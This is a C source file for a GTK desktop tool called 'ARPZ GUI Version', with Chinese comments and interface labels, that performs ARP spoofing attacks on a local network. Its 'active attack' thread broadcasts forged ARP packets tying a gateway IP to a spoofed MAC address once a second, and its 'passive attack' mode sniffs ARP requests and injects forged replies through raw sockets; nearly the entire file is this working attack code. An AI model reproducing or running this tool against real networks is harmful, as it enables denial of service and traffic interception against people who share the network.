#include <gtk/gtk.h>
#include <string.h>
#include <pthread.h>
#include "arpz_header.h"
#include "arpz_util.h"
#include <sys/ipc.h>
#include <sys/msg.h>

GtkWidget *window, *box, *setting_table, *status_table, *setting_frame, *status_frame;
GtkWidget *nic_label, *nic_combo, *mode_label, *mode_s_radio, *mode_a_radio;
GtkWidget *gate_label, *gate_entry, *dst_label, *dst_entry;
GtkWidget *start_btn;
GtkWidget *status_text;
GtkTextBuffer *buffer;
GtkTextIter *Iter;
pthread_t active_th;
GtkTextIter start, end;

/*IPC*/
#define PATHNAME_FTOK 	"/etc/services"
#define PROJ_ID_FTOK	1
#define PERMISSION		0644

struct messageGUI {
	long mtype;
	unsigned char *pkt;
};

int CreateMsgQuGUI (void) {
	int msgq;
	key_t key;

	if ((key = ftok(PATHNAME_FTOK, PROJ_ID_FTOK)) == -1) {
		perror("FTOK");
		exit(-1);
	}

	if ((msgq = msgget(key, PERMISSION | IPC_CREAT)) == -1) {
		perror("msgget");
		exit(-1);
	}

	return msgq;
}

void SendMsgGUI (const int msgq, struct messageGUI msg_buff) {
	if (msgsnd(msgq, &msg_buff, sizeof(struct messageGUI), 0) == -1) {
		//if (msg)
		perror("msgsnd");
		exit(-1);
	}
}

struct messageGUI *ReceiveMsgGUI (const int msgq) {
	struct messageGUI *msg_buff;

	msg_buff = (struct messageGUI *)malloc(sizeof(struct messageGUI));
	if (msgrcv(msgq, msg_buff, sizeof(struct messageGUI), 0, 0) == -1) {
		perror("msgrcv");
		free(msg_buff);
		msg_buff = NULL;
	}
	return msg_buff;
}

void DestroyMsgQGUI (int msgq) {
	if (msgctl(msgq, IPC_RMID, NULL) == -1) {
		perror("msgctl");
	}
}


int SendRawPacketGUI (int sockfd, void *buff, int len) {
	int slen;

	if ((slen = write(sockfd, buff, len)) != len) {
		printf("Sent %d bytes\n", slen);
		return 0;
	}
	return 1;
}
/*Advanced ARP DOS Mode*/

void *SnifferThreadGUI (void *arg) {
	int raw, len, pkt_len;
	unsigned char pkt_buff[2048], *pkt;
	struct sockaddr_ll sll;
	struct ethernet_header *ethhdr;
	struct arp_header *arphdr;
	struct messageGUI buff;
	
	int msgq = *((int *)arg);
	
	g_print("sniff %d\n", msgq);
			
	pkt_len = sizeof(sll);

	/*Create Raw Socket*/
	raw = CreateRawSocket(ETH_P_ARP);
	BindToInterface(raw, device, ETH_P_ARP);
	
	g_print("Bind OK\n");
	
	/*Loop until user terminate*/
	while (1) {
		bzero(pkt_buff, 2048);

		if ((len = recvfrom(raw, pkt_buff, 2048, 0, (struct sockaddr *)&sll, (socklen_t *)&pkt_len)) == -1) {
			g_print("Recv Error\n");
			
			perror("recvfrom");
			exit(1);
		}else if (len < sizeof(struct ethernet_header) + sizeof(struct arp_header)) {
			printf("Packet is too small\n");
			continue;
		}else {
			/*Packet reveived successfully*/
			ethhdr = (struct ethernet_header *)pkt_buff;
				
			if (ethhdr->pro == htons(ETH_P_ARP)) {	/*is arp packet*/
				arphdr = (struct arp_header *)(pkt_buff + sizeof(struct ethernet_header));

				if (arphdr->opcode == htons(ARPOP_REQUEST)) {/*is requst*/
					struct in_addr tmpaddr;
					////tmpaddr.s_addr = (in_addr_t)arphdr->spa;
					memcpy(&(tmpaddr.s_addr), arphdr->spa, 4);
					
					char tmp_text[100];
					
					gdk_threads_enter(); //在需要与图形窗口交互的时候加
					
					sprintf(tmp_text, "Sniffer: ARP REQ from MAC %s IP %s\n", ether_ntoa(arphdr->sha), inet_ntoa(tmpaddr));
					gtk_text_buffer_insert(GTK_TEXT_BUFFER(buffer),&start,tmp_text,strlen(tmp_text));/*插入文本到缓冲区*/
					
					gdk_threads_leave(); //在需要与图形窗口交互的时候加
					
					/*Send packet to MSGQ for Injector*/
					pkt = (unsigned char *)malloc(len);
					memcpy(pkt, pkt_buff, len);

					/**/
					buff.mtype = 1;
					buff.pkt = pkt;

					/*Send*/
					SendMsgGUI(msgq, buff);
				}
			}
		}
	}
	close(raw);
}

/*Injection Thread*/
//#define SPOOFED_MAC "a2:34:de:45:11:ff"
void *InjectionThreadGUI (void *arg) {
	int raw;
	struct ethernet_header *ethhdr;
	struct arp_header *arphdr;
	//unsigned char *pkt;
	
	int msgq = *((int *)arg);
	struct messageGUI *buff;
	unsigned char tmp[6];

	raw = CreateRawSocket(ETH_P_ALL);
	BindToInterface(raw, device, ETH_P_ALL);

	while (1) {
		g_usleep(100000);
		g_print("Inje %d\n", msgq);
		
		buff = ReceiveMsgGUI (msgq);

		if (buff) {	/*Get msg*/
			ethhdr = (struct ethernet_header *)(buff->pkt);
			arphdr = (struct arp_header *)(buff->pkt + sizeof(struct ethernet_header));

			/*CHange Ethernet headers*/

			memcpy(ethhdr->dst, ethhdr->src, 6);

			memcpy(ethhdr->src, (void *)ether_aton(SPOOFED_MAC), 6);

			/*Change ARP Headers*/

			arphdr->opcode = htons(ARPOP_REPLY);

			memcpy(tmp, arphdr->sha, 6);
			memcpy(arphdr->sha, (void *)ether_aton(SPOOFED_MAC), 6);
			memcpy(arphdr->tha, tmp, 6);

			memcpy(tmp, arphdr->spa, 4);
			memcpy(arphdr->spa, arphdr->tpa, 4);
			memcpy(arphdr->tpa, tmp, 4);

			/*Injection*/
			char tmp_text[20];
			
			gdk_threads_enter(); //在需要与图形窗口交互的时候加
			
			if (SendRawPacketGUI(raw, buff->pkt, sizeof(struct ethernet_header) + sizeof(struct arp_header))) {
				
				sprintf(tmp_text, " Injection Successfully\n");
				gtk_text_buffer_insert(GTK_TEXT_BUFFER(buffer),&start,tmp_text,strlen(tmp_text));/*插入文本到缓冲区*/
			}else {
				sprintf(tmp_text, " Injection Error\n");
				gtk_text_buffer_insert(GTK_TEXT_BUFFER(buffer),&start,tmp_text,strlen(tmp_text));/*插入文本到缓冲区*/
			}
			
			gdk_threads_leave(); //在需要与图形窗口交互的时候加
			
			free(buff->pkt);
			free(buff);
		}
	}
	close(raw);
}

/*主动攻击模式主线程*/
void active_thread(void *arg) {
	int sockfd, len, cnt = 0;
	char *pkt, tmp_text[50];	
	
	sockfd = CreateRawSocket(ETH_P_ALL);

   BindToInterface(sockfd, device, ETH_P_ARP);
        
    /*Construct Package*/
    pkt = malloc(sizeof(struct ethernet_header) + sizeof(struct arp_header));
    CreateEtherHeader(pkt, BRAODCAST_MAC, SPOOFED_MAC, ETH_P_ARP);
    CreateARPHeader(pkt, SPOOFED_MAC, gate_ip, BRAODCAST_MAC, dst_ip);
    len = sizeof(struct ethernet_header) + sizeof(struct arp_header);
    
    //gtk_text_buffer_get_bounds(GTK_TEXT_BUFFER(buffer),&start,&end);/*获得缓冲区开始和结束位置的Iter*/
    
    while (write(sockfd, pkt, len) != -1) {
        sprintf(tmp_text, "Sent %d Packets\n", ++cnt);
        g_print("Sent %d Packets\n", cnt);
        gtk_text_buffer_insert(GTK_TEXT_BUFFER(buffer),&start,tmp_text,strlen(tmp_text));/*插入文本到缓冲区*/
        g_usleep(1000000);
    }
}

/*被动攻击模式主线程*/
void passive_mode(char *device) {

}
/*处理单选按钮事件*/
void radio_callback (GtkWidget *widget, gpointer data) {
	if (gtk_toggle_button_get_active (GTK_TOGGLE_BUTTON (widget))) 
    {
        /* 简单模式开启 */
        gtk_editable_set_editable (GTK_EDITABLE(gate_entry), TRUE);
        gtk_editable_set_editable (GTK_EDITABLE(dst_entry), TRUE);
        //GTK_ENTRY(gate_entry)->editable = TRUE;
        g_print("S mode\n");
    
    } else {
        gtk_editable_set_editable (GTK_EDITABLE(gate_entry), FALSE);
        gtk_editable_set_editable (GTK_EDITABLE(dst_entry), FALSE);
        g_print("A mode\n");
    }
}

/*处理开始按钮事件*/
void start_callback (GtkWidget *widget, gpointer data)
{
	 int mode;
	 //GtkTextIter start, end;
	 extern char device[], gate_ip[], dst_ip[];
	 strncpy(gate_ip, gtk_entry_get_text(GTK_ENTRY(gate_entry)), 20);
	 strncpy(dst_ip, gtk_entry_get_text(GTK_ENTRY(dst_entry)), 20);
	 strncpy(device, gtk_combo_box_get_active_text(GTK_COMBO_BOX(nic_combo)), 20);
	 g_print("%s %s %s\n", device, gate_ip, dst_ip);
	 
	 mode = GTK_TOGGLE_BUTTON(mode_s_radio)->active ? 0 : 1;
	 gtk_text_buffer_get_bounds(GTK_TEXT_BUFFER(buffer),&start,&end);/*获得缓冲区开始和结束位置的Iter*/
	 
    if (gtk_toggle_button_get_active (GTK_TOGGLE_BUTTON (widget))) 	/*按钮状态为开启*/
    {
    	 //gdk_threads_enter(); //在需要与图形窗口交互的时候加
    	
       gtk_button_set_label(GTK_BUTTON(widget), "结 束");
       const gchar *text = mode == 1 ? "被动攻击模式开始\n程序正在监听.......\n" : "主动攻击模式开始\n正在发送ARP数据包.......\n";
		 gtk_text_buffer_insert(GTK_TEXT_BUFFER(buffer),&start,text,strlen(text));/*插入文本到缓冲区*/
    	 gtk_widget_show(status_text);
    	 
    	 //gdk_threads_leave(); //在需要与图形窗口交互的时候加
    	 
    	 /*判断模式*/
    	 if (mode == 0) {	/*被动模式*/
    	 	//active_mode(device, gate_ip, dst_ip);
    	 	g_thread_create((GThreadFunc)active_thread, NULL, FALSE, NULL);
    	 	
    	 }else if (mode == 1) { /*主动模式*/
    	 	
			int *msgq;
			GThread *sniffer, *injector;
			/*init message queue*/
			msgq = (int *)malloc(sizeof(int));
			*msgq = CreateMsgQuGUI();
			
			
			g_print("main: %d\n", *msgq);
			
    	 	//passive_mode(device);
    	 	injector = g_thread_create((GThreadFunc)InjectionThreadGUI, (void *)msgq, TRUE, NULL);
    	 	sniffer = g_thread_create((GThreadFunc)SnifferThreadGUI, (void *)msgq, TRUE, NULL);
    	 	
    	 	//g_thread_join(sniffer);
    	 	//g_thread_join(injector);
    	 }
    } else {
        gtk_button_set_label(GTK_BUTTON(widget), "开 始");
        //gtk_main_quit();
    }
}

int main(int argc, char *argv[]) {
	
	if(!g_thread_supported()) g_thread_init(NULL);
	gdk_threads_init();
	/*初始化*/
	gtk_init(&argc, &argv);
	
	window = gtk_window_new(GTK_WINDOW_TOPLEVEL);
	gtk_window_set_position(GTK_WINDOW(window), GTK_WIN_POS_CENTER);
	gtk_window_set_title(GTK_WINDOW(window), "ARPZ GUI Version");
	gtk_window_set_resizable(GTK_WINDOW(window), FALSE);
	
	gtk_container_set_border_width(GTK_CONTAINER(window), 10);
	
	box = gtk_vbox_new(FALSE, 0);
	gtk_container_add(GTK_CONTAINER(window), box);
	
	/*参数面板*/
	setting_frame = gtk_frame_new("参数");
	gtk_frame_set_shadow_type(GTK_FRAME(setting_frame), GTK_SHADOW_ETCHED_IN);
	gtk_box_pack_start(GTK_BOX(box), setting_frame, TRUE, TRUE, 0);
	
	setting_table = gtk_table_new(2, 4, TRUE);
	gtk_table_set_row_spacings(GTK_TABLE(setting_table), 5);
  	gtk_table_set_col_spacings(GTK_TABLE(setting_table), 5);
	gtk_container_add(GTK_CONTAINER(setting_frame), setting_table);
	
	nic_label = gtk_label_new("选择网卡:");
	gtk_table_attach_defaults(GTK_TABLE(setting_table), nic_label, 0, 1, 0, 1);
	
	nic_combo = gtk_combo_box_new_text();
	gtk_combo_box_append_text(GTK_COMBO_BOX(nic_combo), "eth0");
	gtk_combo_box_append_text(GTK_COMBO_BOX(nic_combo), "wlan0");
	gtk_combo_box_append_text(GTK_COMBO_BOX(nic_combo), "lo");
	gtk_combo_box_set_active (GTK_COMBO_BOX(nic_combo), 0);
	gtk_table_attach_defaults(GTK_TABLE(setting_table), nic_combo, 1, 2, 0, 1);
	
	mode_label = gtk_label_new("选择模式:");
	gtk_table_attach_defaults(GTK_TABLE(setting_table), mode_label, 2, 3, 0, 1);
	
	GtkWidget *box1 = gtk_hbox_new(TRUE, 0);
	gtk_table_attach_defaults(GTK_TABLE(setting_table), box1, 3, 4, 0, 1);

	mode_s_radio = gtk_radio_button_new_with_label(NULL, "主动模式");
	g_signal_connect(mode_s_radio, "clicked", G_CALLBACK(radio_callback), NULL);
	gtk_box_pack_start(GTK_BOX(box1), mode_s_radio, TRUE, TRUE, 0);

	mode_a_radio = gtk_radio_button_new_with_label_from_widget(
		GTK_RADIO_BUTTON(mode_s_radio), "被动模式");
	gtk_box_pack_start(GTK_BOX(box1), mode_a_radio, TRUE, TRUE, 0);
	
	gate_label = gtk_label_new("网关 IP:");
	gtk_table_attach_defaults(GTK_TABLE(setting_table), gate_label, 0, 1, 1, 2);
	gate_entry = gtk_entry_new();
	gtk_table_attach_defaults(GTK_TABLE(setting_table), gate_entry, 1, 2, 1, 2);

	dst_label = gtk_label_new("目标 IP:");
	gtk_table_attach_defaults(GTK_TABLE(setting_table), dst_label, 2, 3, 1, 2);
	dst_entry = gtk_entry_new();
	gtk_table_attach_defaults(GTK_TABLE(setting_table), dst_entry, 3, 4, 1, 2);
	
	/*状态面板*/
	status_frame = gtk_frame_new("状态");
	gtk_frame_set_shadow_type(GTK_FRAME(status_frame), GTK_SHADOW_ETCHED_IN);
	gtk_box_pack_start(GTK_BOX(box), status_frame, TRUE, TRUE, 0);
	
	status_text = gtk_text_view_new();
	gtk_widget_set_size_request(status_text, 400, 200); //NB
	buffer=gtk_text_view_get_buffer(GTK_TEXT_VIEW(status_text));
	gtk_container_add(GTK_CONTAINER(status_frame), status_text);
	
	/*开始按钮*/
	start_btn = gtk_toggle_button_new_with_label("开 始");
	gtk_box_pack_start(GTK_BOX(box), start_btn, TRUE, TRUE, 5);
	g_signal_connect(start_btn, "clicked", G_CALLBACK(start_callback), NULL);
	
	
	g_signal_connect(window, "destroy", G_CALLBACK(gtk_main_quit), NULL);
	gtk_widget_show_all(window);
	
	//g_thread_create(image_go, arg, FALSE, NULL);
	gdk_threads_enter();
	gtk_main();
	gdk_threads_leave();
	
	return 0;
	 
}
